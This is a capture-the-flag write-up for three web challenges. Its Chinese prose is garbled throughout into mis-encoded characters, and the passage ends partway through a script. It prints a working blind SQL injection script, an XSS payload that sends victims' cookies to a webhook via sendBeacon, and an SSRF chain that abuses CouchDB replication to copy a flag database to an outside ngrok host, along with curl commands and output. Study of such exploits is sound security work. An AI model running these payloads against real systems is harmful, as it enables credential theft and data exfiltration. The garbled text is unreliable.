æŠŠè¿™ä¸ªå€¼ç»™è¯•å‡ºæ¥\nè‹±æ–‡ç‰ˆè®²è§£ï¼šThe SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\nè·å¾—å¯†ç åä»¥ginkoidçš„è´¦å·ç™»å½•ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ä»€ä¹ˆæ‰€è°“çš„éšå†™ flagå°±åœ¨æŠ“åŒ…åå¯ä»¥çœ‹åˆ°\nâ€”â€”â€”â€”å…¶å®è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ç–‘é—®ï¼Œä¸ºä»€ä¹ˆselect substr(password,n,1) from userså°±èƒ½ç¡®ä¿æ˜¯ginoidçš„passwdå‘¢ï¼Ÿginkoidæ˜¯è¡¨ä¸­çš„ç¬¬ä¸€æ¡æ•°æ®ï¼Œåœ¨æ–°å»ºè¡¨åç«‹åˆ»æ’å…¥ï¼Œè¿™å°±å¯ä»¥ä¿è¯åœ¨æŸ¥è¯¢çš„æ—¶å€™åªæŸ¥ginkoidçš„å¯†ç å—ï¼Ÿ\ndiscordä¹‹å‰æœ‰äººé—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶çš„è§£ç­”æ˜¯è¿™æ˜¯sqlliteçš„ç‰¹æ€§ï¼Œä½†æ˜¯ç”¨sqlliteåœ¨çº¿å·¥å…·å°è¯•åå‘ç°ä¹Ÿä¸æ˜¯è¿™æ ·çš„ ä¹Ÿä¼šè¿”å›æ‰€æœ‰æ•°æ®çš„substr(x,x,x)çš„å€¼ï¼Œä½†æ˜¯ç¡®å®æ˜¯ç”¨è¿™æ ·çš„payloadèƒ½åšå‡ºæ¥\nâ€”â€”â€”â€”åæ¥æƒ³äº†ä¸€ä¸‹ æ˜¯è¿™é‡Œçš„return correct_password[0][0]==password ç¡®ä¿äº†è™½ç„¶sqlæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯å¾ˆå¤šä¸ªå•ä¸€å­—æ¯ï¼Œä½†æ˜¯æ˜¯å¤šè¡Œè¿”å›ï¼Œä»ç„¶åªä¼šå–åˆ°ç¬¬ä¸€ä¸ªï¼›å†åŠ ä¸Šusernameæ˜¯ä¸»é”® ç¬¬ä¸€ä¸ªæ’å…¥ï¼Œæ‰€ä»¥è¿™ä¸ªpayloadæ˜¯å¯ä»¥çš„\nä»¥ä¸€ä¸ªäº‹åè¯¸è‘›äº®çš„è§’åº¦æ¥çœ‹return correct_password[0][0]==password è¿™å¥ä»£ç  å…¶å®æœ‰æš—ç¤ºçš„æˆåˆ†åœ¨äº†\nâ€”â€”â€”â€”è¿˜æœ‰å¦ä¸€ç‰ˆçš„è„šæœ¬ discordé‡Œæ”¶çš„\nimport asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\nå…ˆçœ‹é¡µé¢ æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå…ˆå¡«ç”¨æˆ·åå’Œå¯†ç å†ç‚¹loginæˆ–registerï¼Œå°è¯•test: testç™»å…¥ï¼Œç•Œé¢æ˜¯ä¸€ä¸ªå¯ä»¥åŠ notes è‡ªå®šbodyå’Œtagçš„app\nåœ¨view notesçœ‹åˆ°å·²ç»æœ‰äººè¯•è¿‡xssäº†ï¼Œè¿™é‡Œæœ‰ä¸ªå°å°çš„è¶Šæƒæ¼æ´ï¼Œ/view/+usernameç›´æ¥å¯ä»¥çœ‹åˆ°å…¶ä»–çš„å¸ˆå‚…åœ¨å°è¯•ä»€ä¹ˆæ ·çš„payloadï¼ˆçœ‹äº†wpä»¥åæ‰æ„è¯†åˆ°è¿™é‡Œçš„tagéƒ¨åˆ†å°±æ˜¯æ³¨å…¥ç‚¹ è€Œå½“æ—¶çš„æˆ‘ä»¥ä¸ºæ˜¯å¡bugäº†\nç®€å•å®¡äº†ä¸‹æºç ï¼Œä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„ï¼Œé¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªadminå·ï¼Œflagåœ¨adminçš„privateåˆ†ç±»çš„notesä¸­ï¼›å¯¹äºä¸ªäººå‘çš„notesä¼šè½¬ä¹‰bodyéƒ¨åˆ†ä¸ºhtmlå®ä½“æ¥é¢„é˜²xss\nä½†æ˜¯è¿™ä¸ªnotes-appçš„å½¢å¼æ˜¯å¦¥å¦¥çš„xssäº†ï¼Œé‚£çªç ´å£åœ¨å“ªé‡Œæï¼Ÿå…¶å®æ˜¯è¢«å¿½ç•¥çš„tagéƒ¨åˆ†ï¼ä¸€èˆ¬æƒ…å†µä¸‹çœ‹åˆ°tagå¯é€‰private/publicå°±ä¼šä¸å…³æ³¨è¿™é‡Œï¼Œä½†æ˜¯é…åˆç‰¹æ®Šçš„DOMè§£æ è¿™é‡Œæ— ç–‘æ˜¯æ³¨å…¥ç‚¹ï¼ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹ï¼Œå‚è€ƒwp\nä»/static/view.htmlä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªnotes-appçš„å‰ç«¯æ¸²æŸ“æ‰€å‡­å€Ÿçš„æ¨¡æ¿é•¿å•¥æ ·\nbodyéƒ¨åˆ†è¢«å®Œå…¨çš„ä¿æŠ¤äº†ï¼Œä½†æ˜¯tagæ²¡æœ‰è¿‡æ»¤ åªæ˜¯é™åˆ¶äº†ä¸ªæ•°\næˆ‘ä»¬åˆ©ç”¨çš„å°±æ˜¯æµè§ˆå™¨è§£æhtmlçš„éƒ¨åˆ†ï¼Œå¯ä»¥è®©ä¸ç›¸å…³çš„å‡ ä¸ªnotesæ‹¼æ¥åœ¨ä¸€èµ·ï¼ˆä¸¾ä¸ªç®€å•çš„æ —å­ï¼šåœ¨ä¸€ä¸ªnoteé‡Œé¢ç”¨\u0026lt;p\u0026gt; å¦ä¸€ä¸ªé‡Œé¢æ”¾\u0026lt;/p\u0026gt;ï¼Œä¸­é—´çš„éƒ¨åˆ†ä¼šè¢«æ”¾åœ¨ä¸€èµ·ï¼‰è¿™é‡Œé€‰ç”¨çš„æ˜¯\u0026lt;style\u0026gt;è¿™ä¸ªtagï¼Œåˆ©ç”¨å®ƒonloadçš„å±æ€§\nè¿˜æœ‰ä¸€ä¸ªå¾…è§£å†³çš„é—®é¢˜æ˜¯ä¸Šä¸‹ä¸¤ä¸ªnotesä¹‹é—´ä¼šæœ‰\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;çš„å­˜åœ¨ï¼›è¿™ä¹Ÿæ˜¯ä¸ç”¨\u0026lt;iframe\u0026gt;å’Œå®ƒçš„onloadå±æ€§çš„åŸå› ï¼Œå› ä¸ºæµè§ˆå™¨æ˜¯ä¸å…è®¸\u0026lt;iframe\u0026gt;ä¸­å±æ€§æ¢è¡Œçš„\næˆ‘ä»¬æœ€ç»ˆçš„payload\nbody: anything tag: \u0026lt;style a=\u0026#39; body: anything tag: \u0026#39;onload=\u0026#39;` body: `;eval(somecode)/* tag: */\u0026#39;\u0026gt; ç„¶åæ˜¯å¸¸è§„çš„xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\njavaå¯ä»¥è¯´æ˜¯å®Œå…¨ä¸æ‡‚ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ç®€å•çœ‹äº†ä¸‹å°±æºœäº†ï¼Œå‚è€ƒ è§£æ³•1 - _replicator è§£æ³•2 - _find\nä¸€ä¸ªç®€å•çš„java-appï¼Œæ£€æµ‹ç»™å‡ºçš„apiæ˜¯å¦æ­£å¸¸ å¹¶ä¸”è¿”å›ä¸€ä¸ªjson\nç»™äº†docker\nå…ˆç”¨jd-guiæ‰“å¼€jaråŒ…çœ‹çœ‹æºç \nå…ˆçœ‹Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œå–å‡ºadminçš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠflagçš„å€¼ï¼Œæ–°å»ºä¸€ä¸ªdatabaseï¼Œåˆ†å‡º3ä¸ªè·¯ç”±ï¼›\nå…ˆçœ‹database.classï¼ˆåˆ†æçš„æ¯”è¾ƒè¯¦ç»† ä¹‹å‰åšjavaå¾ˆå°‘\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } å­˜å‚¨ä»main.classé‡Œæ¥æ”¶åˆ°çš„adminUsername\u0026amp;adminPasswordï¼›getDbString()è¿”å›ä¸€ä¸ªå¯ä»¥ç”¨æ¥è¿æ¥couchdbæ•°æ®åº“çš„url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } é€šè¿‡å‘æ„é€ å¥½çš„urlå‘é€httpè¯·æ±‚æ¥åˆ›å»ºæ•°æ®åº“ï¼Œæœ‰ä¸‰ä¸ªé»˜è®¤çš„åº“ï¼š_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff } è¿™éƒ¨åˆ†æ˜¯åˆ›å»ºç”¨æˆ·å¹¶æ’å…¥æ•°æ®åº“ä¸­ å¹¶ä¸”æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¬¸ ç”¨çš„ä¹Ÿæ˜¯httpå‘è¯·æ±‚è¿™ä¸€æ‹› è¿™ä¸å°±å¯æ§äº†ï¼Ÿ\nè¿™é‡Œå°±å®Œäº†ï¼Œè½¬å»çœ‹Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } å½“å‘å‡ºä¸€ä¸ªè¯·æ±‚ å¸¦ç€usernameå’Œpasswdæ—¶ï¼Œå®ƒä¼šè°ƒç”¨createUser()åˆ›å»ºä¸€æ¡ç”¨æˆ·çš„æ•°æ®å­˜å…¥åº“ä¸­ï¼Œå¹¶ä¸”å­˜ä¸€ä¸ªflagDocï¼›æ¥ç€çœ‹æœ€åä¸€ä¸ªtestAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } å¯¹ç»™å‡ºçš„urlï¼ˆé€šè¿‡urlå‚æ•°è¿›è¡Œæäº¤ï¼‰è¿›è¡Œgetæˆ–è€…postï¼Œå…ˆæ£€æŸ¥if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))ï¼Œå¦‚æœä¸ºçœŸç›´æ¥æŠ¥é”™ï¼›ä¹‹åå‘å‡ºè¯·æ±‚ å¦‚æœUtils.containsFlag(stringJsonObj)ä¸ºçœŸä¹Ÿä¼šæŠ¥é”™å‡ºå»\næºç ç®—æ˜¯çœ‹å®Œäº†ï¼Œæ¥ä¸‹æ¥æƒ³æƒ³è§£é¢˜çš„æ–¹æ³•ï¼ˆæœ‰éƒ¨åˆ†å…³äºssrfçš„å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡é¼»ç¥–ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsaiï¼‰\næœ¬åœ°å…ˆèµ·ä¸€ä¸ªç¯å¢ƒï¼Œrun on localhost:8080ï¼Œ\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! ç”±ä¹‹å‰çš„ä»£ç åˆ†ææˆ‘ä»¬çŸ¥é“å› ä¸ºcouchdbçš„å­˜åœ¨æ‰€ä»¥illegalï¼Œä½†æ˜¯ä¸å¤ªé‡è¦ï¼ˆåæ­£ç»ˆä¼šè¢«ç»•è¿‡ï¼‰å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } æ˜¾ç„¶å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬çš„fake flagä¼šè¢«è‡ªåŠ¨æ’å…¥è¿™ä¸ªæ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”ç›´æ¥curlæ˜¯å¯ä»¥å–å‡ºæ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æ˜¯ä¸èƒ½ç›´æ¥curl éœ€è¦ç¼åˆåˆ°é™å®šçš„testAPIä¸Šï¼Œå°è¯•æ„é€ ä¸€ä¸‹~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success è¿™æ ·æ„é€ çš„urlå¹¶ä¸ä¼šè§¦å‘filterï¼Œä½†æ˜¯ç”±äºä»…ä»…è¿”å›successè€Œæ²¡æœ‰æ›´å¤šçš„ä¿¡æ¯ï¼Œä¸ºäº†éªŒè¯æ˜¯ä¸æ˜¯è§¦åŠåˆ°äº†couchdb serverï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„docï¼Œè¿™é‡Œç”¨pyè„šæœ¬ä¼ \nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } è¶³ä»¥è¯æ˜æˆ‘ä»¬è‡ªå·±æ„é€ çš„å¸¦testAPIçš„ç¼åˆæ€ªæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œcouchdbç›¸å…³çš„å¢åˆ æŸ¥æ”¹åŠŸèƒ½çš„\nè€Œé‡è¦çš„æ˜¯è¿œç¨‹ä¹Ÿèƒ½æ‰“é€šï¼Œè¿™é‡Œæœ‰è¿™ä¹ˆä¸ªå¥½ä¸œè¥¿https://docs.couchdb.org/en/3.1.1/replication/replicator.htmlï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ç»„postæ•°æ®å°±å¯ä»¥è¿œç¨‹å¾—åˆ°ä¸€ä»½æ•°æ®ï¼\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } è‡³äºåšæ³•å°±å¾ˆç®€å•äº†ï¼šå…ˆç”¨ngrokæä¸€ä¸ªç½‘ä¸Šå¯è®¿é—®çš„couchdbï¼Œå¾—åˆ°ä¸´æ—¶çš„url https://2d0a4710580a.ngrok.ioï¼Œå…ˆåˆ›å»ºæ•°æ®åº“æ¥ä¾¿äºæ¥æ”¶ä¹‹åå¤åˆ¶çš„æ•°æ®\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} ç„¶åå°±å¯ä»¥åˆ©ç”¨replicatorå’Œç²¾å¿ƒæ„é€ çš„jsonæ•°æ®å¤§æç‰¹æäº†ï¼å…ˆæœ¬åœ°\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } å¥½è€¶ï¼å¤åˆ¶æ€ªå¥½è€¶ï¼\nè™½ç„¶ä¸Šé¢è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®æ ¸å¿ƒæ€è·¯ä¹ŸæŒºæ¸…æ™°çš„ï¼Œå°±æ˜¯å…ˆè®¤çœŸåˆ†ææºç  æ‰¾å‡ºæ¼æ´ç‚¹æ˜¯ç”¨couchdbåˆ›å»ºç”¨æˆ·æ—¶ä¼šè‡ªåŠ¨æ’å…¥flag è¿™ä¸ªè¿‡ç¨‹æ˜¯ä½¿ç”¨httpè¯·æ±‚ æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ ä¸€ä¸ªurlåˆ›å»ºç”¨æˆ· è®©flagè¿›å…¥è‡ªå·±æŒæ§çš„æ•°æ®åº“ä¸­ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„è¿›è¡Œæ•°æ®åº“çš„å¢åˆ æŸ¥æ”¹ï¼›ä½†æ˜¯è¿™è¿˜éœ€è¦æ¥ä¸Šé¢˜ç›®ä¸­ç»™å‡ºçš„testAPIå…¥å£æ‰è¡Œï¼Œåˆç»è¿‡ä¸€äº›æ„é€ å¯ä»¥æˆåŠŸç¼åˆï¼›ä½†æ˜¯ç”±äºé¸¡è´¼çš„è®¾ç½® testAPIå¤„çš„è¯·æ±‚åªä¼šè¿”å›æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸ºäº†ç¡®åˆ‡çš„å¾—åˆ°flagï¼Œæˆ‘ä»¬åˆ©ç”¨äº†couchdbçš„_replicatorè¿™ä¸ªå¥½ä¸œè¥¿æ¥è¿›è¡Œä¸€ä¸ªæ•°æ®çš„å¤åˆ¶ï¼Œå¾—åˆ°flag~~~\nâ€”â€”â€”â€”ä»¥ä¸‹æ˜¯ç¬¬äºŒç§è§£æ³•: char-by-char-blind-sqli\næºç çš„åˆ†æä¸å˜ï¼Œè¿™æ˜¯æ ¹æœ¬ï¼Œå·®å¼‚ä¹‹å¤„é¦–å…ˆåœ¨äºæ„é€ urlæ—¶è¿™é‡Œåˆ©ç”¨äº†couchdbçš„å¦ä¸€ä¸ªå¥½ä¸œè¥¿_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; æœ¬åœ°æµ‹è¯•å¯ä»¥æˆåŠŸä¼šæ˜¾å‡ºflagï¼›ç¬¬äºŒä¸ªå·®å¼‚åœ¨ç¼åˆtestAPIçš„æ—¶å€™ï¼Œç”±äºfilterå¯¹äºå¤§å°å†™ä¸å¤ªæ•æ„Ÿï¼Œæ‰€ä»¥å¤§å†™Couchæ¥ç»•è¿‡äº†ï¼›åŒæ ·é¢ä¸´å›æ˜¾åªæœ‰æˆåŠŸæˆ–å¤±è´¥ ä½†æ˜¯char-by-char-blind-sqliæ— æ‰€ç•æƒ§~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def 